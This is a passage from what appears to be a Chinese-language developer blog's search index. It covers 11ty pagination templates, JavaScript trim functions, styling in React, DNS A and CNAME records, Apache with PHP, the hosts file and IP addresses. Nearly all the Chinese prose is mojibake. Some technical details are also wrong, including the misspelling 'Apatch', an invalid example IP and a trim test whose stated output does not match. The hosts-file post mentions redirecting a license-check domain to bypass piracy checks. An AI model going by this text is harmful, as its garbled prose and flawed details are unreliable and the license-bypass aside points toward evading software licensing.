æ˜¯ç”¨ä¾†ç”¢ç”Ÿåˆ†é çš„è³‡æ–™ä¾†æºï¼Œsize å‰‡æ˜¯æ¯ä¸€å€‹é é¢è¦é¡¯ç¤ºå¹¾ç­†è³‡æ–™ é€é pagination ç‰©ä»¶æŠŠè³‡æ–™æ¸²ç„¶åˆ° template ä¸­ è½èµ·ä¾†ä¸è¤‡é›œå§ï¼ä¸éé‡é»æ˜¯ pagination çš„å…§å®¹æ˜¯ä»€éº¼ï¼Ÿå®˜æ–¹å·²ç¶“å¾ˆè²¼å¿ƒçš„å…ˆå¹«ä½ åˆ—å‡ºä¾†äº†ï¼š 1234567891011121314151617181920{ items: [], // ç›®å‰é é¢ä¸­è©²å‡ºç¾çš„è³‡æ–™ pageNumber: 0, // ç›®å‰çš„é æ•¸ hrefs: [], // æ‰€æœ‰åˆ†é çš„è·¯å¾‘ï¼ˆä¾åºï¼‰ href: { next: \"â€¦\", // ä¸‹ä¸€é çš„é€£çµ previous: \"â€¦\", // ä¸Šä¸€é çš„é€£çµ first: \"â€¦\", // é¡æ¨... last: \"â€¦\", // é¡æ¨... }, pages: [], // æ‰€æœ‰é é¢çš„è³‡æ–™ï¼ˆä¾åºï¼‰ page: { next: {}, // ä¸‹ä¸€é çš„è³‡æ–™ previous: {}, // ä¸Šä¸€é çš„è³‡æ–™ first: {}, // é¡æ¨... last: {}}, // é¡æ¨... }} æ‰€ä»¥ä¸Šé¢ç”¨ for item in pagination.items å°±å¯ä»¥æŠŠç•¶å‰é é¢çš„è³‡æ–™å–å‡ºä¸¦æ¸²æŸ“å‡ºä¾†ã€‚ 11ty çš„ pagination ç‰©ä»¶æä¾›äº†å¾ˆå¤šçš„æœ‰ç”¨çš„è³‡è¨Šï¼Œåªè¦çŸ¥é“å¦‚ä½•åˆ©ç”¨é€™äº›è³‡è¨Šå°±å¯ä»¥å®Œæˆå¤§å¤šæ•¸çš„åˆ†é åŠŸèƒ½å›‰ã€‚ æ›é åŠŸèƒ½å‰é¢å·²ç¶“ä»‹ç´¹éåˆ†é çš„è™•ç†ï¼Œç¾åœ¨ä¾†åŠ ä¸Šã€Œåˆ‡æ›é é¢ã€çš„åŠŸèƒ½å§ï¼ä¸€æ¨£å…ˆä¾†çœ‹æ®µç¯„ä¾‹ï¼š 123456789101112131415161718192021222324---pagination: data: testData size: 2testData: [item1, item2, item3, item4]---&lt;h1&gt;Paged List&lt;/h1&gt;&lt;!-- æ–‡ç« åˆ—è¡¨ --&gt;&lt;ul&gt; {% for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor %}&lt;/ul&gt;&lt;!-- ä¸Šä¸€é æŒ‰éˆ• --&gt;{% if pagination.href.previous %}&lt;a href=\"{{ pagination.href.previous }}\"&gt;Prev&lt;/a&gt;{% endif %}&lt;!-- ä¸‹ä¸€é æŒ‰éˆ• --&gt;{% if pagination.href.next %}&lt;a href=\"{{ pagination.href.next }}\"&gt;Next&lt;/a&gt;{% endif %} çµæ§‹ä¸Šè·Ÿå‰é¢çš„ç¯„ä¾‹å·®ä¸å¤šï¼Œç¾åœ¨åªæ˜¯å¤šç”¨äº† pagination.href çš„è³‡è¨Šä¾†åŠ ä¸Šä¸Šä¸€é å’Œä¸‹ä¸€é çš„æŒ‰éˆ•è€Œå·²ï¼Œç›¸ä¿¡æ‡‰è©²ä¸é›£ç†è§£ã€‚ æœ€å¾Œæ¸²æŸ“å‡ºä¾†çš„ç•«é¢æœƒé•·é€™æ¨£ï¼š å¦‚æœä½ æƒ³æ”¹æˆé ç¢¼çš„å½¢å¼çš„è©±ï¼Œä¹Ÿå¯ä»¥é€™æ¨£å¯«ï¼š 1234567891011121314151617181920---pagination: data: testData size: 2testData: [item1, item2, item3, item4, item5, item6, item7, item8, item9, item10, item11]---&lt;h1&gt;Paged List&lt;/h1&gt;&lt;!-- æ–‡ç« åˆ—è¡¨ --&gt;&lt;ul&gt; {% for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor %}&lt;/ul&gt;&lt;!-- é ç¢¼æŒ‰éˆ• --&gt;{% for n in range(0, pagination.pages.length) %}&lt;a href=\"{{ pagination.hrefs[n] }}\"&gt;{{ n+1 }}&lt;/a&gt;{% endfor %} è¨»ï¼šé ç¢¼çš„å¯«æ³•æœ‰å¾ˆå¤šç¨®ï¼Œä¹Ÿå¯ä»¥åƒè€ƒå®˜æ–¹æä¾›çš„ ç¯„ä¾‹ã€‚ é€™æ¨£å­æŒ‰éˆ•å°±æœƒç”¨ 1 2 3 4... çš„æ–¹å¼ä¾†å‘ˆç¾ï¼Œä¸éé€™è£¡åªæ˜¯ç¤ºç¯„åŸºæœ¬æ¦‚å¿µï¼Œç´°ç¯€çš„éƒ¨åˆ†å°±äº¤çµ¦ä½ ä¾†è™•ç†å›‰ï¼","link":"/2023/01/09/11ty-note/"},{"title":"å…©ç¨®å¯¦ä½œ trim çš„æ–¹æ³•","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œå› ç‚ºç¬¬äºŒç¨®è§£æ³•å¾ˆæœ‰è¶£ï¼Œä½†åˆæ€•æˆ‘å“ªå¤©å°±å¿˜è¨˜äº†ï¼Œæ‰€ä»¥ç‰¹åˆ¥é–‹ä¸€ç¯‡æ–‡ç« ä¾†è¨˜éŒ„ã€‚ æ–¹æ³•ä¸€é€™æ˜¯æˆ‘æœ€ç›´è¦ºæƒ³åˆ°çš„æ–¹æ³•ï¼Œæ‰¾å‡ºã€Œé ­è·Ÿå°¾çš„ç¬¬ä¸€å€‹å‡ºç¾éç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ã€ï¼š 12345678910111213141516171819202122232425262728293031323334function trim(s) { // çµæœå­—ä¸² let result = '' // å„²å­˜èµ·é»ä½ç½® let first = 0 // å„²å­˜çµ‚é»ä½ç½® // è¦æ³¨æ„è¼¸å…¥ç‚º ' ' çš„ edge case let last = s.length - 1 // æ‰¾å‡ºå¾å‰é¢æ•¸ä¾†ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ for(let i=0; i&lt;s.length; i++) { if(s[i] !== ' ') { first = i break } } // æ‰¾å‡ºå¾å¾Œé¢æ•¸ä¾†ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ for(let i=s.length-1; i&gt;=0; i--) { if(s[i] !== ' ') { last = i break } } // çµ„åˆå­—ä¸² // æ³¨æ„è¦ &lt;= æ‰èƒ½å–åˆ°çµ‚é»ä½ç½®å­—å…ƒ for(let i=first; i&lt;=last; i++) { result += s[i] } return result}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc æ›´ç°¡æ½”çš„å¯«æ³•ä¸€æ¨£çš„é‚è¼¯ï¼Œä½†å¯ä»¥ç”¨å…§å»ºå‡½å¼ä¾†å¯«çš„æ›´ç°¡æ½”ï¼š 1234567891011121314151617181920212223242526272829303132333435function trim(str) { // è½‰æˆé™£åˆ— // =&gt; [' ', ' ', 'a', 'b', 'c', ' ', ' '] const strArr = str.split('') // å¾å·¦é‚Šé–‹å§‹æ‰¾å‡ºç¬¬ä¸€å€‹ä¸æ˜¯ç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ // findIndex æœƒæ‰¾å‡ºç¬¬ä¸€å€‹å›å‚³ true çš„ç´¢å¼•å€¼ // includes æœƒæ ¹æ“šæœå°‹å€¼å›å‚³ true æˆ– false // ä¸‹é¢çš„é‚è¼¯å¯ä»¥é€™æ¨£æ€è€ƒï¼š // 'abc'.includes('a') =&gt; åœ¨ abc è£¡é¢æ‰¾æœ‰æ²’æœ‰ a =&gt; true // ' '.includes('a') =&gt; åœ¨ ç©ºå­—ä¸² è£¡é¢æ‰¾æœ‰æ²’æœ‰ a =&gt; false // !(' ').includes('a') =&gt; åœ¨ éç©ºå­—ä¸² è£¡é¢æ‰¾æœ‰æ²’æœ‰ a =&gt; true // æ‰€ä»¥æ›å¥è©±èªªåªè¦æ˜¯ã€Œä¸æ˜¯ç©ºå­—ä¸²ã€éƒ½æœƒæ˜¯ true // å› æ­¤ findIndex å¯ä»¥å°±æ‰¾å‡ºç¬¬ä¸€å€‹éç©ºå­—ä¸²çš„ç´¢å¼•å€¼ const start = strArr.findIndex(elem =&gt; !(' ').includes(elem)) // å…ˆå°‡é™£åˆ—åè½‰ï¼Œæ¥è‘—ç”¨å‰›å‰›çš„é‚è¼¯æ‰¾å‡ºç¬¬ä¸€å€‹ä¸æ˜¯ç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ // æ³¨æ„å› ç‚ºæ˜¯åè½‰å¾Œçš„é™£åˆ—ï¼Œæ‰€ä»¥ç´¢å¼•å€¼ä¸€æ¨£æ˜¯å¾ 0 é–‹å§‹ const end = strArr.reverse().findIndex(elem =&gt; !(' ').includes(elem)) // é—œæ–¼ str.length-end çš„é€™æ®µå¯ä»¥é€™æ¨£æ€è€ƒï¼š // å‡è¨­ end = 0 // end = length-0 =&gt; å€’æ•¸ç¬¬ 0 å€‹ // slice(start, length) // å‡è¨­ end = 1 // end = length-1 =&gt; å€’æ•¸ç¬¬ 1 å€‹ // slice(start, length -1) // å‡è¨­ end = 2 // end = length-2 =&gt; å€’æ•¸ç¬¬ 2 å€‹ // slice(start, length -1) // ... return str.slice(start, str.length-end)}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc æ–¹æ³•äºŒé€™æ˜¯åƒè€ƒåˆ¥äººå¾Œå­¸åˆ°çš„è§£æ³•ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ã€Œå…ˆæŠŠå‰é¢çš„ç©ºç™½å»æ‰ï¼Œå†æŠŠå¾Œé¢çš„ç©ºç™½å»æ‰ã€ï¼š 12345678910111213141516171819202122232425262728293031323334function trim(s) { // å„²å­˜ç‹€æ…‹ let isFrontWhiteSpaceFounded = false // å„²å­˜ç‹€æ…‹ let isBackWhiteSpaceFounded = false // å„²å­˜å»æ‰å‰é¢ç©ºç™½å¾Œçš„å­—ä¸² let front = '' // å„²å­˜å»æ‰å¾Œé¢ç©ºç™½å¾Œçš„å­—ä¸² let back = '' // å…ˆå»æ‰å‰é¢çš„ç©ºç™½ for(let i=0; i&lt;s.length; i++) { // ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒæ‰¾åˆ°å¾Œï¼ŒisFrontWhiteSpaceEnd æœƒè®Š true // æ‰€ä»¥æ¥ä¸‹ä¾†å‡ºç¾çš„ç©ºç™½å­—å…ƒä¹Ÿéƒ½æœƒè¢«å¡«å…¥ if(s[i] !== ' ' || isFrontWhiteSpaceFounded) { front += s[i] isFrontWhiteSpaceFounded = true } } // æ¥è‘—å»æ‰å¾Œé¢çš„ç©ºç™½ for(let i=front.length-1; i&gt;=0; i--) { // ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒæ‰¾åˆ°å¾Œï¼ŒisBackWhiteSpaceFounded æœƒè®Š true // æ‰€ä»¥æ¥ä¸‹ä¾†å‡ºç¾çš„ç©ºç™½å­—å…ƒä¹Ÿéƒ½æœƒè¢«å¡«å…¥ if(front[i] !== ' ' || isBackWhiteSpaceFounded) { // é †åºè¦é€™æ¨£æ‰æœƒå°ï¼Œä¸ç„¶æœƒè®Šæˆé¡›å€’æ–‡å­— back = front[i] + back isBackWhiteSpaceFounded = true } } return back}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc é€™è§£æ³•çœ‹å¹¾æ¬¡éƒ½è¦ºå¾—ç¥å¥‡ Î£(Â°Ğ”Â°;","link":"/2021/12/29/2-way-to-trim/"},{"title":"ä¸‰ç¨®åœ¨ React ä¸­å¯« CSS çš„æ–¹å¼","text":"å¾ä»Šå¤©é–‹å§‹èªè­˜ CSS-In-JSã€‚ inline style123456789101112131415161718function Title () { // æ³¨æ„å‚³å…¥çš„æ˜¯ç‰©ä»¶ // å±¬æ€§åç¨±ä¸å¯ä»¥ã€Œ-ã€ï¼Œæ‰€ä»¥è¦ CamelCase const tiltestyle = { color : 'yellow', fontSize: '3em', backgroundColor: 'green', padding: '10px' } return &lt;h1 style={tiltestyle}&gt;Hello Big man&lt;/h1&gt;}function App() { return ( &lt;div className=\"App\"&gt; &lt;Title /&gt; &lt;/div&gt; );} ç†Ÿæ‚‰çš„ className123456789import './App.css';function App() { return ( &lt;div className=\"App\"&gt; &lt;Title /&gt; &lt;/div&gt; );} å› ç‚º class æ˜¯ä¿ç•™å­—ï¼Œæ‰€ä»¥æ”¹ç”¨ className ä¾†è¡¨ç¤ºã€‚ CSS-In-JSï¼ˆstyled Componentï¼‰ç›®å‰çš„å…©å¤§ä¸»æµæ‡‰è©²æ˜¯ Emotion æˆ– styled-componentsï¼Œæˆ‘ç›®å‰å­¸çš„æ˜¯å¾Œè€…ã€‚ å…©ç¨®é›–ç„¶æœ‰äº›å·®åˆ¥ï¼Œä½†ä¸»è¦çš„ pattern å·®åˆ¥ä¸å¤§ï¼Œç¸½ä¹‹å¯«èµ·ä¾†å¤§æ¦‚æœƒåƒé€™æ¨£ï¼š 12345678910111213const Button = styled.button` display: inline-block; border-radius: 4px; padding: 8px 12px; background-color: black; border: none; color: white; cursor: pointer; &amp;:hover { color: red; }` å°±å¦‚åŒã€Œstyled-componetã€é€™å€‹åç¨±ï¼Œå®ƒå°±è·Ÿå»ºç«‹ä¸€å€‹ Component æ²’å…©æ¨£ï¼Œåªæ˜¯å¯ä»¥åœ¨è£¡é¢å¯« CSSã€‚ é€™æ¨£å¯«çš„ç‰¹é»æœ‰å¹¾å€‹ï¼š å¯ä»¥å¯« SCSS èªæ³•ï¼ˆç•¢ç«Ÿæœ¬è³ªä¸Šé‚„æ˜¯ JSï¼Œå¾—å…ˆç¶“éè½‰è­¯ï¼‰ ä¸ç”¨ç®¡ class æœƒä¸æœƒè¡çªï¼Œå®ƒæœƒå¹«ä½ è‡ªå‹•ç”¢ç”Ÿä¸€å€‹å¾ˆåƒäº‚æ•¸çš„ class Name ä¸ç”¨ç®¡ prefixï¼Œå®ƒæœƒè‡ªå‹•åŠ ï¼ˆå¥½æ£’æ£’ï¼ï¼‰","link":"/2022/04/05/3-way-to-write-css-in-react/"},{"title":"ç¶²åŸŸä¸­ A å’Œ CNAME çš„å·®åˆ¥","text":"å¶ç„¶æƒ³åˆ°ä¸€å€‹è »ç°¡å–®çš„è§£é‡‹ã€‚ æƒ³æˆè®Šæ•¸å°±å¥½äº†å…¶å¯¦ CNAME çš„æœ€ä¸»è¦çš„ä½œç”¨æ˜¯ç”¨ä¾†æŠŠã€ŒåŸæœ¬çš„åŸŸåã€å–ä¸€å€‹ã€Œåˆ¥åã€ï¼Œä¾‹å¦‚åŸæœ¬æ˜¯ peanu.twï¼Œç¾åœ¨æ·»åŠ ä¸€å€‹ CNAME å¾Œè®Šæˆ www.peanu.twï¼Œæ‰€ä»¥ç”¨å…©å€‹ç¶²å€éƒ½å¯ä»¥é€£åˆ° 127.0.0.1 é€™å€‹ IP ä½å€ã€‚ ç”¨ç¨‹å¼ç¢¼çš„è©±å¯ä»¥é€™æ¨£è¡¨ç¤ºï¼š 1234// Apeanu.tw = '127.0.0.1';// CNAMEwww.peanu.tw = '127.0.0.1'; æ‰€ä»¥ä½ ä¹Ÿå¯ä»¥é€™æ¨£å­è¨­å®š CNAMEï¼š 123456// Apeanu.tw = '127.0.0.1';// CNAMEwww.peanu.tw = '127.0.0.1';blog.peanu.tw = '127.0.0.1';messageBoard.peanu.tw = '127.0.0.1'; å¯æ˜¯é€™æ¨£å…¶å¯¦æœ‰å€‹å•é¡Œï¼Œç•¶ä»Šå¤© IP ä½å€æ”¹è®Šçš„è©±æˆ‘å°±å¾—æ”¹æ‰€æœ‰çš„ A å’Œæ‰€æœ‰çš„ CNAMEï¼š 123456// Apeanu.tw = '666.0.0.1';// CNAMEwww.peanu.tw = '666.0.0.1';blog.peanu.tw = '666.0.0.1';messageBoard.peanu.tw = '666.0.0.1'; æ‰€ä»¥æ›´å¥½çš„åšæ³•æ‡‰è©²è¦åƒé€™æ¨£ï¼š 1234567891011// è¨­å®š A æŒ‡å‘çš„ IP ä½å€const A = '127.0.0.1';// åŸŸå = Apeanu.tw = A;// è¨­å®š CNAME æŒ‡å‘çš„ IP ä½å€const CNAME = peanu.tw;// åŸŸå = CNAMEwww.peanu.tw = CNAME;blog.peanu.tw = CNAME;messageBoard.peanu.tw = CNAME; é€™æ¨£å­åšçš„è©±ï¼Œç•¶ A çš„ IP ä½å€è®Šäº†ï¼Œæ‰€æœ‰çš„ CNAME ä¹Ÿæœƒè‡ªå‹•è·Ÿè‘—è®Šï¼Œå°±ä¸ç”¨ä¸€å€‹ä¸€å€‹æ”¹äº†ã€‚","link":"/2022/03/08/a-and-cname-difference/"},{"title":"Apatch èˆ‡ PHP çš„é‹ä½œåŸç†","text":"åšå¤§ç²¾æ·±ã€‚ ç°¡è¿° Apatchæˆ‘å€‘ç”¨çš„ XAMPP æ˜¯ Base onã€ŒApatchã€é€™å€‹ä¼ºæœå™¨çš„ã€‚æ‰€ä»¥åœ¨åŸ·è¡Œ php çš„å¯¦éš›æµç¨‹æ˜¯é€™æ¨£ï¼š 1request =&gt; Apatch =&gt; php =&gt; output =&gt; Apatch =&gt; response åƒè€ƒç²¾ç¾çš„åœ–ï¼š ç”¨æ–‡å­—èªªæ˜çš„è©±æ˜¯é€™æ¨£ï¼š ç™¼ä¸€å€‹ request åˆ° Apatch Apatch æ”¶åˆ° requestï¼Œä¸Ÿçµ¦æŒ‡å®šçš„æª”æ¡ˆè™•ç†ï¼ˆä¾‹å¦‚ index.phpï¼‰ index.php åŸ·è¡Œå®Œå¾Œå¾—åˆ° outputï¼ˆä¾‹å¦‚ index.htmlï¼‰ï¼Œä¸Ÿå›å»çµ¦ Apatch Apatch å†æŠŠ output ç•¶ä½œ response ä¸Ÿå›å» é‡é»å°±æ˜¯å¦‚æœæ²’æœ‰ Apatch ä½ å°±æ‹¿ä¸åˆ°ä»»ä½• responseï¼Œå› ç‚ºæ²’æœ‰äººä¾†è™•ç†ä½ çš„ requestã€‚ ç°¡è¿° PHPPHP å°±æ˜¯ä¸€å€‹ã€Œè¶…æ–‡å­—ï¼ˆHyper Textï¼‰ã€é è™•ç†å™¨ï¼Œè·Ÿ HTML çš„å·®åˆ¥åœ¨æ–¼ä»–å¯ä»¥æ˜¯ã€Œå‹•æ…‹çš„ã€ã€‚ ç¸½ä¹‹å‘¢ï¼ŒPHP å°±æ˜¯ç”¨ç¨‹å¼ä¾†å¹«ä½ ç”¢å‡ºä¸€å€‹ HTML æª”æ¡ˆï¼ˆæˆ–ä¹Ÿæœ‰å¯èƒ½æ˜¯å…¶ä»–æª”æ¡ˆï¼‰ï¼Œæ¯ä¸€æ¬¡çš„çµæœä¸ä¸€å®šæœƒä¸€æ¨£ï¼Œå› ç‚ºå…§å®¹æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ã€‚ å‡è¨­æˆ‘å¯«äº†ä¸€å€‹ PHP é•·é€™æ¨£ï¼š 1234567// peanu.php&lt;?php $age = 23; $name = 'PeaNu'; echo 'Hello, ' . 'I\\'m ' . $name . '&lt;br&gt;'; echo 'I am ' . $age . 'years old.';?&gt; æˆ‘å¯ä»¥åœ¨ CLI ä¸ŠåŸ·è¡Œï¼š 1php peanu.php å°±æœƒå¾—åˆ°ï¼š 1Hello, I'm PeaNu&lt;br&gt;I am 23years old. å‚™è¨»ï¼šè¨˜ä½é€™è£¡ä¸æ˜¯ç€è¦½å™¨ï¼Œæ‰€ä»¥ &lt;br&gt; æ‰æ²’æœ‰è¢«è§£ææˆä½ ç†Ÿæ‚‰çš„é‚£å€‹æ›è¡Œã€‚ é€™å€‹å°±æ˜¯ã€ŒPHP çš„è¼¸å‡ºçµæœã€ï¼ŒåŒæ™‚ä¹Ÿæ˜¯ Apatch è¦ç•¶ä½œ response çš„æ±è¥¿ã€‚ æ‰€ä»¥å¦‚æœæ²’æœ‰ PHP æœƒæ€æ¨£ï¼Ÿä½ ä¸€æ¨£æœƒæ‹¿åˆ° responseï¼Œä½†æ‹¿åˆ°çš„æ˜¯æ²’æœ‰è™•ç†éçš„åŸå§‹ç¢¼ï¼š 123456&lt;?php $age = 23; $name = 'PeaNu'; echo 'Hello, ' . 'I\\'m ' . $name . '&lt;br&gt;'; echo 'I am ' . $age . 'years old.';?&gt; ä»¥ä¸Šå°±æ˜¯ PHP æ‰€æ‰®æ¼”çš„è§’è‰²ã€‚ ç¸½çµæ‰€ä»¥ä½ å¯ä»¥æŠŠ Apatch æƒ³æˆæ˜¯å¹«ä½ æŠŠ request ä¸Ÿçµ¦æŒ‡å®šçš„ handler è™•ç†ï¼Œæœ€å¾Œå¾—åˆ°çµæœå¾Œåœ¨æŠŠ response çµ¦ä½ ã€‚ ç”¨ç¨‹å¼ä¾†å¯«çš„è©±å¯èƒ½å°±é•·é€™æ¨£ï¼š 123456789function sever(request) { // æŠŠ request ä¸Ÿçµ¦ xxx.php è™•ç† const response = php(request) // æŠŠ php çš„ output ç•¶ä½œ response return response}// å° server ç™¼å‡º requestsever(index.php) æœ€å¾Œä¸è¦å¿˜äº†ï¼š Server å…¶å¯¦åªæ˜¯ä¸€å€‹ç¨‹å¼ï¼Œåªæ˜¯å®ƒæ˜¯ç”¨ä¾†è™•ç† request çš„ç¨‹å¼ã€‚ å…¶ä»–è£œå…… ä¸€å€‹ request è¦ä¸Ÿçµ¦èª°è™•ç†éƒ½æ˜¯ç”± server ä¾†æ±ºå®šï¼Œå®ƒæƒ³ä¸Ÿçµ¦èª°å°±ä¸Ÿçµ¦èª°ã€‚ä½†æˆ‘å€‘ç”¨çš„ XAMPP é è¨­æ˜¯ç”±ã€Œæª”æ¡ˆè·¯å¾‘ã€ä¾†æ±ºå®šè¦ä¸Ÿçµ¦èª°ã€‚ç¸½ä¹‹å‘¢ï¼Œé€™å€‹è¦å‰‡æ˜¯å¯ä»¥æ”¹çš„ï¼Œä¸æ˜¯ä¸€å®šè¦ç…§é€™å€‹è¦å‰‡ã€‚","link":"/2022/01/30/about-apatch-and-php/"},{"title":"ä½ ä¸çŸ¥é“çš„ hosts è¨­å®šæª”","text":"ä»Šå¤©æ‰çŸ¥é“ã€‚ èˆ‡ DNS çš„é—œä¿‚æ ¹æ“šä½ çš„ç¶“é©—ï¼Œæˆ‘å€‘åœ¨é€£ç·šåˆ°ä¸€å€‹ç¶²ç«™ä¹‹å‰ï¼ˆä¾‹å¦‚ï¼šgoogle.comï¼‰å¾—å…ˆé€£åˆ° DNS çš„ä¼ºæœå™¨ï¼ŒæŸ¥è©¢ google.com æ˜¯å°æ‡‰åˆ°å“ªå€‹ IP åœ°å€ï¼Œæ¥è‘—æ‰çœŸçš„é€£åˆ° google çš„ç¶²é ã€‚ ä½†å…¶å¯¦åœ¨é€£åˆ° DNS ä¹‹å‰é‚„æœ‰ä¸€å€‹å‹•ä½œï¼šå…ˆåˆ° hosts æª”æ¡ˆè£¡é¢çœ‹æœ‰æ²’æœ‰ç´€éŒ„ hosts æ˜¯ä¸€å€‹ç”¨ä¾†ç´€éŒ„ã€ŒåŸŸåã€è·Ÿã€ŒIP åœ°å€ã€çš„ç´”æ–‡å­—æª”æ¡ˆï¼Œå¯ä»¥æƒ³æˆæ˜¯é›»è©±ç°¿çš„æ„Ÿè¦ºã€‚é€™å€‹æª”æ¡ˆé€šå¸¸æ”¾åœ¨ C:\\Windows\\System32\\drivers\\etc è£¡é¢ï¼Œå¦‚æœä½ æ‰“é–‹ä¾†çœ‹å¤§æ¦‚æ˜¯é•·é€™æ¨£ï¼š 1234567891011121314151617181920212223# Copyright (c) 1993-2009 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.## Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a '#' symbol.## For example:## 102.54.94.97 rhino.acme.com # source server# 38.25.63.10 x.acme.com # x client host# localhost name resolution is handled within DNS itself.# 127.0.0.1 localhost# ::1 localhost127.0.0.1 iccert.nhi.gov.tw #mNHIICC use this. æˆ‘å€‘ä¸€èˆ¬æœ€å¸¸è¦‹çš„ localhostï¼ˆåŸŸåï¼‰æœƒå°æ‡‰åˆ° 127.0.0.1 é€™å€‹ IP åœ°å€ã€‚ 127.0.0.1 æ˜¯ä¸€å€‹æ¯”è¼ƒç‰¹æ®Šçš„ IP åœ°å€ï¼Œä»£è¡¨ã€Œé€™å°é›»è…¦ã€ï¼Œæ„æ€æ˜¯èªªä½ ä¸ç®¡ç”¨å“ªå°é›»è…¦å»é€£åˆ° 127.0.0.1ï¼Œéƒ½ç­‰åŒæ˜¯ã€Œé€£åˆ°è‡ªå·±çš„é›»è…¦ã€ã€‚ æ‰€ä»¥å¦‚æœåœ¨ hosts æª”æ¡ˆåŠ ä¸Šï¼š 1127.0.0.1 github.com ç•¶æˆ‘ä¸‹æ¬¡å»é€£ github.com çš„æ™‚å€™å°±æœƒè‡ªå‹•æŠŠæˆ‘å¸¶åˆ° 127.0.0.1 é€™å€‹åœ°å€ã€‚ æ‰€ä»¥é€™èƒ½å¹¹å˜›å—ï¼Ÿæ­£ç•¶çš„ç”¨é€”æ˜¯ç”¨åœ¨æ¸¬è©¦ç¶²ç«™æˆ–ä¼ºæœå™¨çš„æ™‚å€™æ¯”è¼ƒå¸¸ç”¨åˆ°ï¼Œè€Œæ¯”è¼ƒä¸æ­£ç•¶çš„ä¾‹å­å¯èƒ½æœƒæ˜¯ä½ ç”¨ç›œç‰ˆè»Ÿé«”çš„æ™‚å€™ï¼Œå®ƒå¯èƒ½æœƒè¦ä½ å»ä¿®æ”¹ hosts çš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š 1127.0.0.1 kqwerkeitwjiqjgioqqr ä½ å¯ä»¥æƒ³ä¸€ä»¶äº‹ï¼Œæ­£å¸¸çš„æƒ…æ³ä¸‹ä¸€å€‹è»Ÿé«”æœƒé€éç™¼é€ request åˆ°ä¸€å€‹å…¬å¸çš„ä¼ºæœå™¨ä¾†ç¢ºèªæ˜¯å¦ç‚ºæ­£ç‰ˆï¼Œä½†å¦‚æœç›´æ¥æŠŠé€™å€‹ request å°å‘å…¶ä»–åœ°æ–¹æˆ–è€…æ˜¯æ ¹æœ¬ä¸å­˜åœ¨çš„åœ°æ–¹å‘¢ï¼Ÿé€™æ¨£ä¸å°±å¯ä»¥ç•¥éå¯©æ ¸çš„å‹•ä½œäº†å—ï¼Ÿ æ‰€ä»¥æœ‰äº›æ™‚å€™æœƒè¦æ”¹ hosts æª”æ¡ˆçš„å…§å®¹å°±æ˜¯é€™æ¨£å­ï¼Œä½†è¿½æ ¹ç©¶æŸ¢ä¾†èªª hosts åªæ˜¯ä¸€æœ¬é›»è©±ç°¿ï¼Œåœ¨ä½ å…ˆå»è·Ÿ DNS è©¢å•ä¹‹å‰ï¼Œå…ˆæŸ¥è‡ªå·±é›»è…¦è£¡çš„é›»è©±ç°¿ï¼Œå¦‚æœå¾è‡ªå·±çš„é›»è©±ç°¿è£é¢å°±å¯ä»¥æŸ¥åˆ°ï¼Œå°±ä¸ç”¨åœ¨å»è·Ÿ DNS å•åœ°å€äº†ã€‚","link":"/2022/01/05/about-hosts-file/"},{"title":"é—œæ–¼ IP åœ°å€","text":"å°å¿ƒæˆ‘æŸ¥ä½  IPã€‚ å„ç¨® IP åœ°å€é¦–å…ˆè¦çŸ¥é“ IP åœ°å€å¯ä»¥åˆ†æˆï¼š è™›æ“¬ IP åœ°å€ æµ®å‹• IP åœ°å€ å›ºå®š IP åœ°å€ å›ºå®š IP åœ°å€å‡è¨­æœ‰ï¼š é›»è…¦1 =&gt; 20.241.73.84 é›»è…¦2 =&gt; 20.241.73.85 é›»è…¦3 =&gt; 40.13.73.85 ç•¶é€™äº› IP åœ°å€ã€Œä¸æœƒè®Šã€ï¼Œè€Œä¸”å¯ä»¥ã€Œç›´æ¥é€£åˆ°é‚£å°é›»è…¦ã€ï¼Œå°±ä»£è¡¨é€™æ˜¯å›ºå®š IP åœ°å€ã€‚ é€šå¸¸æ˜¯å‡ºç¾åœ¨ã€Œä¼ºæœå™¨ã€çš„æƒ…æ³ï¼Œå› ç‚ºäººå®¶è¦é€£åˆ°ä½ é€™é‚Šçš„æ™‚å€™æ‰æœ‰è¾¦æ³•çŸ¥é“æ­£ç¢ºçš„ä½ç½®åœ¨å“ªè£¡ã€‚ å‚™è¨»ï¼šã€Œç›´æ¥é€£åˆ°é‚£å°é›»è…¦ã€çš„æ„æ€å¤§æ¦‚æ˜¯æŒ‡ä½ å¯ä»¥ç›´æ¥è·Ÿé‚£å°é›»è…¦åšäº’å‹•ã€‚åƒ FTP å°±æ˜¯é€é IP åœ°å€ç›´æ¥é€£åˆ°æŸå°ä¸»æ©Ÿï¼Œç„¶å¾Œä½ æ‰å¯ä»¥æŠŠæª”æ¡ˆå­˜åˆ°é‚£é‚Šå»é€™æ¨£çš„æ¦‚å¿µã€‚è€Œä¸–ç´€å¸åœ‹é€™ç¨®éœ€è¦é  IP åœ°å€ä¾†é€£ç·šçš„æ¦‚å¿µå¤§æ¦‚ä¹Ÿæ˜¯é€™æ¨£å­å§ï¼ˆæˆ‘æƒ³æ˜¯é€™æ¨£å­ï¼‰ã€‚ æµ®å‹• IP 